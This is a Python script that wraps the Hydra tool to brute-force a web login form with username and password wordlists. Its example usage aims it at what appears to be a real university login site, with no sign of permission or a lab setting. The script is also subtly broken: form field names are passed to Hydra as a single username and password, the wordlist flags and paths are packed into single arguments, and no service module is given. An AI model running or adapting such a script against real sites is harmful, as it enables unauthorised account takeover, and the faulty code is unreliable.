import subprocess

def brute_force_login(url, login_field, password_field, username_file, password_file):
    try:
        # Construct the Hydra command
        command = [
            "hydra",  # Hydra executable
            "-l", login_field,  # Login field
            "-p", password_field,  # Password field
            url,  # Target URL
            f"-L {username_file}",  # Username wordlist file
            f"-P {password_file}",  # Password wordlist file
        ]

        # Run Hydra with the given command using subprocess
        result = subprocess.run(command, capture_output=True, text=True)
        return result.stdout
    except FileNotFoundError:
        return "Hydra executable not found. Make sure Hydra is installed and in your system's PATH."

# Example usage
target_url = "https://sidace.ehtp.ac.ma/"
login_field_name = "username"
password_field_name = "password"
username_wordlist_file = "top-usernames-shortlist.txt"  # Replace with the path to the username wordlist file
password_wordlist_file = "2020-200_most_used_passwords.txt"  # Replace with the path to the password wordlist file

output = brute_force_login(target_url, login_field_name, password_field_name, username_wordlist_file, password_wordlist_file)
print(output)
